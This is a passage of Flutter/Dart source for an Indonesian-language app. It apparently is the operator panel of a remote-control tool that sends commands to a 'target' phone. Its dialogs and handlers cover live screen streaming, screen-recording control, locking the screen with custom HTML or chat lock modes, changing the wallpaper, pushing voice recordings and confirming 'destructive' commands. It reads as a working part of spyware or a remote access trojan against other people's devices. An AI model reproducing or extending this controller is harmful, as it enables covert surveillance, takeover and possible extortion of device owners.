            });
          });
        } else {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text('Izin mikrofon ditolak'),
              backgroundColor: Colors.red,
            ),
          );
        }
      } catch (e) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Gagal merekam: $e'),
            backgroundColor: Colors.red,
          ),
        );
      }
    }

    Future<void> _stopRecordingAndUpload(StateSetter setModalState) async {
      try {
        recordTimer?.cancel();
        final path = await audioRecorder.stop();
        setModalState(() {
          isRecording = false;
          uploading = true;
        });

        if (path != null && path.isNotEmpty) {
          String? uploadedUrl = await HttpService.uploadFile(path);
          if (uploadedUrl != null) {
            urlCtrl.text = '$baseUrl$uploadedUrl';
            ScaffoldMessenger.of(context).showSnackBar(
              const SnackBar(
                content: Text('Rekaman berhasil diupload'),
                backgroundColor: Colors.green,
              ),
            );
          } else {
            throw Exception('Upload gagal');
          }
        }
      } catch (e) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Gagal: $e'), backgroundColor: Colors.red),
        );
      } finally {
        setModalState(() => uploading = false);
      }
    }

    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setModalState) => Padding(
          padding: EdgeInsets.only(
            bottom: MediaQuery.of(ctx).viewInsets.bottom,
          ),
          child: Container(
            decoration: const BoxDecoration(
              color: _card,
              borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
            ),
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 28),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 36,
                  height: 4,
                  margin: const EdgeInsets.only(bottom: 20),
                  decoration: BoxDecoration(
                    color: Colors.white24,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: cmd.color.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(cmd.icon, color: cmd.color, size: 22),
                    ),
                    const SizedBox(width: 12),
                    Text(
                      cmd.name,
                      style: const TextStyle(
                        color: _textP,
                        fontSize: 17,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                Row(
                  children: [
                    Expanded(
                      child: ElevatedButton.icon(
                        onPressed: uploading || isRecording
                            ? null
                            : () async {
                                final url = await _pickAudioAndUpload(
                                  setModalState,
                                );
                                if (url != null) urlCtrl.text = url;
                              },
                        icon: const Icon(Icons.folder_open, size: 18),
                        label: const Text('Pilih File'),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: cmd.color,
                        ),
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: ElevatedButton.icon(
                        onPressed: uploading
                            ? null
                            : isRecording
                            ? () => _stopRecordingAndUpload(setModalState)
                            : () => _startRecording(setModalState),
                        icon: Icon(
                          isRecording
                              ? Icons.stop_circle_rounded
                              : Icons.mic_rounded,
                          size: 18,
                        ),
                        label: Text(
                          isRecording
                              ? 'Stop (${(recordSeconds ~/ 60).toString().padLeft(2, '0')}:${(recordSeconds % 60).toString().padLeft(2, '0')})'
                              : 'Rekam Suara',
                        ),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: isRecording
                              ? Colors.redAccent
                              : cmd.color,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                if (uploading)
                  const Padding(
                    padding: EdgeInsets.only(bottom: 12),
                    child: Center(
                      child: SizedBox(
                        width: 20,
                        height: 20,
                        child: CircularProgressIndicator(strokeWidth: 2),
                      ),
                    ),
                  ),
                TextField(
                  controller: urlCtrl,
                  style: const TextStyle(color: _textP),
                  decoration: const InputDecoration(
                    labelText: 'URL Suara (atau hasil rekam/pilih otomatis)',
                    hintText: 'https://...',
                    labelStyle: TextStyle(color: _textS),
                    filled: true,
                    fillColor: _card2,
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.all(Radius.circular(14)),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Row(
                  children: [
                    Expanded(
                      child: OutlinedButton(
                        onPressed: () {
                          audioRecorder.dispose();
                          recordTimer?.cancel();
                          Navigator.pop(ctx);
                        },
                        style: OutlinedButton.styleFrom(
                          side: const BorderSide(color: Colors.white24),
                          padding: const EdgeInsets.symmetric(vertical: 14),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(14),
                          ),
                        ),
                        child: const Text(
                          'Batal',
                          style: TextStyle(color: _textS),
                        ),
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: ElevatedButton(
                        onPressed: () {
                          final url = urlCtrl.text.trim();
                          if (url.isEmpty) {
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(
                                content: Text('URL tidak boleh kosong'),
                                backgroundColor: Colors.red,
                              ),
                            );
                            return;
                          }
                          audioRecorder.dispose();
                          recordTimer?.cancel();
                          Navigator.pop(ctx);
                          _run(cmd, {'url': url});
                        },
                        style: ElevatedButton.styleFrom(
                          backgroundColor: cmd.color,
                          foregroundColor: Colors.white,
                          padding: const EdgeInsets.symmetric(vertical: 14),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(14),
                          ),
                        ),
                        child: const Text(
                          'Kirim',
                          style: TextStyle(fontWeight: FontWeight.bold),
                        ),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    ).whenComplete(() {
      audioRecorder.dispose();
      recordTimer?.cancel();
    });
  }

  Future<void> _showUploadImageDialog(CommandItem cmd) async {
    final urlCtrl = TextEditingController();
    bool uploading = false;

    Future<String?> _pickAndUploadImage(StateSetter setModalState) async {
      FilePickerResult? result = await FilePicker.platform.pickFiles(
        type: FileType.image,
      );
      if (result != null && result.files.single.path != null) {
        setModalState(() => uploading = true);
        try {
          String? uploadedUrl = await HttpService.uploadFile(
            result.files.single.path!,
          );
          if (uploadedUrl != null) return '$baseUrl$uploadedUrl';
          throw Exception('Upload gagal');
        } catch (e) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('Upload gagal: $e'),
              backgroundColor: Colors.red,
            ),
          );
          return null;
        } finally {
          setModalState(() => uploading = false);
        }
      }
      return null;
    }

    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setModalState) => Padding(
          padding: EdgeInsets.only(
            bottom: MediaQuery.of(ctx).viewInsets.bottom,
          ),
          child: Container(
            decoration: const BoxDecoration(
              color: _card,
              borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
            ),
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 28),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 36,
                  height: 4,
                  margin: const EdgeInsets.only(bottom: 20),
                  decoration: BoxDecoration(
                    color: Colors.white24,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: cmd.color.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(cmd.icon, color: cmd.color, size: 22),
                    ),
                    const SizedBox(width: 12),
                    Text(
                      cmd.name,
                      style: const TextStyle(
                        color: _textP,
                        fontSize: 17,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                Row(
                  children: [
                    Expanded(
                      child: ElevatedButton.icon(
                        onPressed: uploading
                            ? null
                            : () async {
                                final url = await _pickAndUploadImage(
                                  setModalState,
                                );
                                if (url != null) urlCtrl.text = url;
                              },
                        icon: const Icon(Icons.add_photo_alternate, size: 18),
                        label: const Text('Pilih Foto'),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: cmd.color,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                if (uploading) const CircularProgressIndicator(),
                TextField(
                  controller: urlCtrl,
                  style: const TextStyle(color: _textP),
                  decoration: const InputDecoration(
                    labelText: 'URL Gambar',
                    filled: true,
                    fillColor: _card2,
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.all(Radius.circular(14)),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Row(
                  children: [
                    Expanded(
                      child: OutlinedButton(
                        onPressed: () => Navigator.pop(ctx),
                        child: const Text(
                          'Batal',
                          style: TextStyle(color: _textS),
                        ),
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: ElevatedButton(
                        onPressed: () {
                          final url = urlCtrl.text.trim();
                          if (url.isEmpty) return;
                          Navigator.pop(ctx);
                          _run(cmd, {'url': url});
                        },
                        style: ElevatedButton.styleFrom(
                          backgroundColor: cmd.color,
                        ),
                        child: const Text('Ganti Wallpaper'),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _showLockModeDialog(CommandItem cmd) async {
    final modeCtrl = TextEditingController(text: 'default');
    final urlCtrl = TextEditingController();
    bool uploading = false;

    Future<void> pickAndUploadFile() async {
      FilePickerResult? result = await FilePicker.platform.pickFiles();
      if (result != null && result.files.single.path != null) {
        setState(() => uploading = true);
        try {
          String? uploadedUrl = await HttpService.uploadFile(
            result.files.single.path!,
          );
          if (uploadedUrl != null) {
            urlCtrl.text = '$baseUrl$uploadedUrl';
            ScaffoldMessenger.of(context).showSnackBar(
              const SnackBar(
                content: Text('File berhasil diupload'),
                backgroundColor: Colors.green,
              ),
            );
          }
        } catch (e) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('Upload gagal: $e'),
              backgroundColor: Colors.red,
            ),
          );
        } finally {
          setState(() => uploading = false);
        }
      }
    }

    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setState) => Padding(
          padding: EdgeInsets.only(
            bottom: MediaQuery.of(ctx).viewInsets.bottom,
          ),
          child: Container(
            decoration: const BoxDecoration(
              color: _card,
              borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
            ),
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 28),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 36,
                  height: 4,
                  margin: const EdgeInsets.only(bottom: 20),
                  decoration: BoxDecoration(
                    color: Colors.white24,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: cmd.color.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(cmd.icon, color: cmd.color, size: 22),
                    ),
                    const SizedBox(width: 12),
                    Text(
                      cmd.name,
                      style: const TextStyle(
                        color: _textP,
                        fontSize: 17,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                TextField(
                  controller: modeCtrl,
                  style: const TextStyle(color: _textP),
                  decoration: const InputDecoration(
                    labelText: 'Mode',
                    hintText: 'default / html / chat',
                    labelStyle: TextStyle(color: _textS),
                    filled: true,
                    fillColor: _card2,
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.all(Radius.circular(14)),
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                Row(
                  children: [
                    Expanded(
                      child: TextField(
                        controller: urlCtrl,
                        style: const TextStyle(color: _textP),
                        decoration: const InputDecoration(
                          labelText: 'URL',
                          hintText: 'https://... atau file://...',
                          labelStyle: TextStyle(color: _textS),
                          filled: true,
                          fillColor: _card2,
                          border: OutlineInputBorder(
                            borderRadius: BorderRadius.all(Radius.circular(14)),
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(width: 8),
                    ElevatedButton.icon(
                      onPressed: uploading ? null : pickAndUploadFile,
                      icon: uploading
                          ? const SizedBox(
                              width: 16,
                              height: 16,
                              child: CircularProgressIndicator(strokeWidth: 2),
                            )
                          : const Icon(Icons.upload_file, size: 18),
                      label: Text(uploading ? '' : 'Upload'),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: cmd.color,
                        foregroundColor: Colors.white,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(14),
                        ),
                        padding: const EdgeInsets.symmetric(
                          vertical: 14,
                          horizontal: 12,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                Row(
                  children: [
                    Expanded(
                      child: OutlinedButton(
                        onPressed: () => Navigator.pop(ctx),
                        style: OutlinedButton.styleFrom(
                          side: const BorderSide(color: Colors.white24),
                          padding: const EdgeInsets.symmetric(vertical: 14),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(14),
                          ),
                        ),
                        child: const Text(
                          'Batal',
                          style: TextStyle(color: _textS),
                        ),
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: ElevatedButton(
                        onPressed: () {
                          final mode = modeCtrl.text.trim().toLowerCase();
                          final url = urlCtrl.text.trim();
                          String param = mode;
                          if (url.isNotEmpty) param = 'mode=$mode&url=$url';
                          Navigator.pop(ctx);
                          _run(cmd, {'mode': mode, 'url': url});
                        },
                        style: ElevatedButton.styleFrom(
                          backgroundColor: cmd.color,
                          foregroundColor: Colors.white,
                          padding: const EdgeInsets.symmetric(vertical: 14),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(14),
                          ),
                        ),
                        child: const Text(
                          'Kirim',
                          style: TextStyle(fontWeight: FontWeight.bold),
                        ),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _run(CommandItem cmd, Map<String, String> inputs) async {
    if (cmd.isDanger && !await _confirmDanger(cmd.name)) return;
    await _resultSub?.cancel();
    _resultSub = null;

    final cmdId = await HttpService.sendCommand(
      deviceId,
      cmd.id,
      buildParam(cmd, inputs),
    );

    if (cmd.id == Cmd.screenStreamStart) {
      Navigator.push(
        context,
        MaterialPageRoute(
          builder: (c) => LiveStreamPage(deviceId: widget.target['device_id'], cmdId: cmdId),
        ),
      );
    }

    setState(() {
      _sending = true;
      _statusMsg = 'Mengirim command: ${cmd.name}...';
      _statusOk = true;
    });

    if (cmd.id == Cmd.lockScreen) {
      try {

        await HttpService.sendCommand(deviceId, Cmd.setLockMode, 'mode=default');
      } catch (e) {
        debugPrint('Gagal reset lock mode: $e');
      }
    }

    if (cmd.id == Cmd.lockChat) {
      try {
        await HttpService.sendCommand(deviceId, Cmd.setLockMode, 'mode=chat');
        await HttpService.sendCommand(deviceId, Cmd.lockScreen, '');
        setState(() {
          _sending = false;
          _statusMsg = '';
        });
        if (mounted) {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => ChatPage(
                deviceId: deviceId,
                deviceName: deviceName,
                sessionKey: AppConfig.sessionKey ?? '',
              ),
            ),
          );
        }
      } catch (e) {
        if (mounted) {
          setState(() {
            _sending = false;
            _statusMsg = 'Error: $e';
            _statusOk = false;
          });
        }
      }
      return;
    }

    try {
      setState(() {
        _statusMsg = '✓ Command terkirim — menunggu hasil via HTTP...';
      });

      Timer? timeoutTimer;
      timeoutTimer = Timer(const Duration(seconds: 90), () {
        if (!mounted) return;
        _resultSub?.cancel();
        _resultSub = null;
        setState(() {
          _sending = false;
          _statusMsg = 'Timeout — target tidak merespons (90 detik)';
          _statusOk = false;
        });
      });

      _resultSub = HttpService.listenResults(deviceId, cmdId: cmdId).listen(
        (result) {
          final type = result['type']?.toString() ?? '';
          if (type.endsWith('_status')) {

            if (mounted) {
              setState(() {
                _statusMsg = result['data']?.toString() ?? 'Memproses...';
              });
            }
            return; // Tetap dengarkan sampai hasil akhir datang
          }

          timeoutTimer?.cancel();
          _resultSub?.cancel();
          if (!mounted) return;
          setState(() {
            _sending = false;
            _statusMsg = '';
          });
          _openResult(result);
        },
        onError: (e) {
          timeoutTimer?.cancel();
          _resultSub?.cancel();
          if (!mounted) return;
          setState(() {
            _sending = false;
            _statusMsg = 'Error: $e';
            _statusOk = false;
          });
        },
        onDone: () {
          timeoutTimer?.cancel();
          if (!mounted || !_sending) return;
          setState(() {
            _sending = false;
            _statusMsg = 'Tidak ada hasil diterima';
            _statusOk = false;
          });
        },
      );
    } catch (e) {
      if (mounted)
        setState(() {
          _sending = false;
          _statusMsg = 'Error: $e';
          _statusOk = false;
        });
    }
  }

  void _openResult(Map<String, dynamic> result) {
    Navigator.push(
      context,
      PageRouteBuilder(
        pageBuilder: (_, a, __) =>
            ResultPage(result: result, deviceId: deviceId),
        transitionsBuilder: (_, a, __, child) => FadeTransition(
          opacity: CurvedAnimation(parent: a, curve: Curves.easeOut),
          child: child,
        ),
      ),
    );
  }

  Future<bool> _confirmDanger(String name) async {
    return await showDialog<bool>(
          context: context,
          builder: (ctx) => AlertDialog(
            backgroundColor: _card,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(20),
            ),
            title: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: const Color(0xFFB71C1C).withOpacity(0.15),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: const Icon(
                    Icons.warning_rounded,
                    color: Color(0xFFB71C1C),
                    size: 20,
                  ),
                ),
                const SizedBox(width: 10),
                const Text(
                  'Peringatan!',
                  style: TextStyle(color: _textP, fontSize: 16),
                ),
              ],
            ),
            content: Text(
              '"$name" DESTRUKTIF dan tidak bisa dibatalkan.\nYakin lanjutkan?',
              style: const TextStyle(color: _textS, height: 1.5),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(ctx, false),
                child: const Text('Batal', style: TextStyle(color: _textS)),
              ),
              ElevatedButton(
                onPressed: () => Navigator.pop(ctx, true),
                style: ElevatedButton.styleFrom(
                  backgroundColor: const Color(0xFFB71C1C),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10),
                  ),
                ),
                child: const Text(
                  'Lanjutkan',
                  style: TextStyle(color: Colors.white),
                ),
              ),
            ],
          ),
        ) ??
        false;
  }

  void _showInput(CommandItem cmd) {
    if (cmd.id == Cmd.setLockMode) {
      _showLockModeDialog(cmd);
      return;
    }
    if (cmd.id == Cmd.changeWallpaper) {
      _showUploadImageDialog(cmd);
      return;
    }
    if (cmd.id == Cmd.sendVoice) {
      _showSendVoiceDialog(cmd);
      return;
    }
    final ctrls = {
      for (final f in cmd.paramFields) f.key: TextEditingController(),
    };
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => Padding(
        padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
        child: Container(
          decoration: const BoxDecoration(
            color: _card,
            borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
          ),
          padding: const EdgeInsets.fromLTRB(20, 12, 20, 28),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                width: 36,
                height: 4,
                margin: const EdgeInsets.only(bottom: 20),
                decoration: BoxDecoration(
                  color: Colors.white24,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: cmd.color.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Icon(cmd.icon, color: cmd.color, size: 22),
                  ),
                  const SizedBox(width: 12),
                  Text(
                    cmd.name,
                    style: const TextStyle(
                      color: _textP,
                      fontSize: 17,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 20),
              ...cmd.paramFields.map(
                (f) => Padding(
                  padding: const EdgeInsets.only(bottom: 12),
                  child: TextField(
                    controller: ctrls[f.key],
                    style: const TextStyle(color: _textP),
                    decoration: InputDecoration(
                      labelText: f.label,
                      hintText: f.hint,
                      labelStyle: const TextStyle(color: _textS),
                      hintStyle: TextStyle(color: _textS.withOpacity(0.4)),
                      filled: true,
                      fillColor: _card2,
                      enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(14),
                        borderSide: const BorderSide(color: Colors.white12),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(14),
                        borderSide: BorderSide(color: cmd.color, width: 1.5),
                      ),
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 4),
              Row(
                children: [
                  Expanded(
                    child: OutlinedButton(
                      onPressed: () => Navigator.pop(ctx),
                      style: OutlinedButton.styleFrom(
                        side: const BorderSide(color: Colors.white24),
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(14),
                        ),
                      ),
                      child: const Text(
                        'Batal',
                        style: TextStyle(color: _textS),
                      ),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: ElevatedButton(
                      onPressed: () {
                        final inputs = {
                          for (final f in cmd.paramFields)
                            f.key: ctrls[f.key]!.text,
                        };
                        Navigator.pop(ctx);
                        _run(cmd, inputs);
                      },
                      style: ElevatedButton.styleFrom(
                        backgroundColor: cmd.color,
                        foregroundColor: Colors.white,
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(14),
                        ),
                      ),
                      child: const Text(
                        'Kirim',
                        style: TextStyle(fontWeight: FontWeight.bold),
                      ),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      body: SafeArea(
        child: Column(
          children: [
            _topBar(),
            if (_sending || _statusMsg.isNotEmpty) _statusBar(),
            _tabs(),
            Expanded(
              child: PageView.builder(
                controller: _pageCtrl,
                onPageChanged: (i) => setState(() => _currentPage = i),
                itemCount: kCategories.length,
                itemBuilder: (_, i) => _grid(kCategories[i]),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _topBar() {
    return Container(
      margin: const EdgeInsets.fromLTRB(14, 14, 14, 0),
      padding: const EdgeInsets.fromLTRB(16, 14, 16, 14),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [_card2, _card, const Color(0xFF0E1A2E)],
        ),
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: _border),
        boxShadow: [
          BoxShadow(
            color: _accent.withOpacity(0.06),
            blurRadius: 22,
            offset: const Offset(0, 10),
          ),
        ],
      ),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 38,
              height: 38,
              decoration: BoxDecoration(
                color: _card2,
                borderRadius: BorderRadius.circular(13),
                border: Border.all(color: _border),
              ),
              child: const Icon(
                Icons.arrow_back_ios_new_rounded,
                color: _textP,
                size: 14,
              ),
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  deviceName,
                  style: const TextStyle(
                    color: _textP,
                    fontWeight: FontWeight.bold,
                    fontSize: 15,
                  ),
                  overflow: TextOverflow.ellipsis,
                ),
                Row(
                  children: [
                    Container(
                      width: 5,
                      height: 5,
                      margin: const EdgeInsets.only(right: 5),
                      decoration: const BoxDecoration(
                        color: Colors.greenAccent,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const Text(
                      'HTTP Mode Aktif',
                      style: TextStyle(color: _success, fontSize: 10),
                    ),
                    const SizedBox(width: 6),
                    Container(
                      padding: const EdgeInsets.symmetric(
                        horizontal: 5,
                        vertical: 1,
                      ),
                      decoration: BoxDecoration(
                        color: _success.withOpacity(0.12),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: const Text(
                        'LONG-POLL',
                        style: TextStyle(
                          color: _success,
                          fontSize: 8,
                          fontWeight: FontWeight.w700,
                        ),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
          if (_isRecording)
            Container(
              margin: const EdgeInsets.only(right: 8),
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
              decoration: BoxDecoration(
                color: const Color(0xFFEF5350).withOpacity(0.15),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: const Color(0xFFEF5350).withOpacity(0.5),
                ),
              ),
              child: const Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(
                    Icons.fiber_manual_record_rounded,
                    color: Color(0xFFEF5350),
                    size: 10,
                  ),
                  SizedBox(width: 5),
                  Text(
                    'LIVE',
                    style: TextStyle(
                      color: Color(0xFFEF5350),
                      fontSize: 11,
                      fontWeight: FontWeight.w800,
                      letterSpacing: 1.2,
                    ),
                  ),
                ],
              ),
            ),
          GestureDetector(
            onTap: () => ScaffoldMessenger.of(context).showSnackBar(
              const SnackBar(
                content: Text('Hasil akan muncul otomatis setelah command'),
              ),
            ),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
              decoration: BoxDecoration(
                color: _accent.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _accent.withOpacity(0.25)),
              ),
              child: const Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Icons.history_rounded, color: _accent, size: 14),
                  SizedBox(width: 5),
                  Text(
                    'Hasil',
                    style: TextStyle(
                      color: _accent,
                      fontSize: 12,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                ],
              ),
            ),
          ),
          const SizedBox(width: 8),
          GestureDetector(
            onTap: () {
              Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (_) => ChatPage(
                    deviceId: deviceId,
                    deviceName: deviceName,
                    sessionKey: AppConfig.sessionKey ?? '',
                  ),
                ),
              );
            },
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
              decoration: BoxDecoration(
                color: _success.withOpacity(0.12),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _success.withOpacity(0.25)),
              ),
              child: const Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Icons.chat_bubble_outline, color: _success, size: 14),
                  SizedBox(width: 5),
                  Text(
                    'Chat',
                    style: TextStyle(
                      color: _success,
                      fontSize: 12,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _recordingBar() {
    final secs = _recordDuration.inSeconds;
    final mm = (secs ~/ 60).toString().padLeft(2, '0');
    final ss = (secs % 60).toString().padLeft(2, '0');
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      decoration: BoxDecoration(
        color: const Color(0xFF1A0000),
        border: const Border(bottom: BorderSide(color: Color(0xFF3D0000))),
      ),
      child: Row(
        children: [
          Container(
            width: 8,
            height: 8,
            decoration: const BoxDecoration(
              color: Color(0xFFEF5350),
              shape: BoxShape.circle,
            ),
          ),
          const SizedBox(width: 8),
          const Text(
            'MEREKAM',
            style: TextStyle(
              color: Color(0xFFEF5350),
              fontSize: 11,
              fontWeight: FontWeight.w800,
              letterSpacing: 1.5,
            ),
          ),
          const SizedBox(width: 8),
          Text(
            '$mm:$ss',
            style: const TextStyle(
              color: Color(0xFFEF5350),
              fontSize: 12,
              fontFamily: 'monospace',
              fontWeight: FontWeight.bold,
            ),
          ),
          const Spacer(),
          GestureDetector(
            onTap: () {
              final stopCmd = kCategories
                  .expand((cat) => cat.commands)
                  .firstWhere(
                    (cmd) => cmd.id == Cmd.screenRecordStop,
                    orElse: () => CommandItem(
                      id: Cmd.screenRecordStop,
                      name: 'Stop Rekaman',
                      icon: Icons.stop_circle_rounded,
                      color: Color(0xFFEF5350),
                      isDanger: false,
                    ),
                  );
              _run(stopCmd, {});
            },
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 5),
              decoration: BoxDecoration(
                color: const Color(0xFFEF5350).withOpacity(0.2),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(
                  color: const Color(0xFFEF5350).withOpacity(0.5),
                ),
              ),
              child: const Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(
                    Icons.stop_circle_rounded,
                    color: Color(0xFFEF5350),
                    size: 13,
                  ),
                  SizedBox(width: 5),
                  Text(
                    'STOP',
                    style: TextStyle(
                      color: Color(0xFFEF5350),
                      fontSize: 11,
                      fontWeight: FontWeight.w800,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _statusBar() {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 250),
      width: double.infinity,
      margin: const EdgeInsets.fromLTRB(14, 10, 14, 0),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 11),
      decoration: BoxDecoration(
        color: _statusOk ? _card2 : _danger.withOpacity(0.1),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: _statusOk ? _border : _danger.withOpacity(0.24),
        ),
      ),
      child: Row(
        children: [
          if (_sending)
            const SizedBox(
              width: 14,
              height: 14,
              child: CircularProgressIndicator(strokeWidth: 2, color: _accent),
            )
          else
            Icon(
              _statusOk ? Icons.check_circle_rounded : Icons.error_rounded,
              color: _statusOk ? _success : _danger,
              size: 15,
            ),
          const SizedBox(width: 9),
          Expanded(
            child: Text(
              _statusMsg,
              style: TextStyle(
                color: _statusOk ? _textS : _danger,
                fontSize: 12,
              ),
            ),
          ),
          if (!_sending && _statusMsg.isNotEmpty)
            GestureDetector(
              onTap: () => setState(() {
                _statusMsg = '';
                _statusOk = true;
              }),
              child: const Icon(Icons.close, color: _textS, size: 14),
            ),
        ],
      ),
    );
  }

  Widget _tabs() {
    return SizedBox(
      height: 50,
      child: ListView.builder(
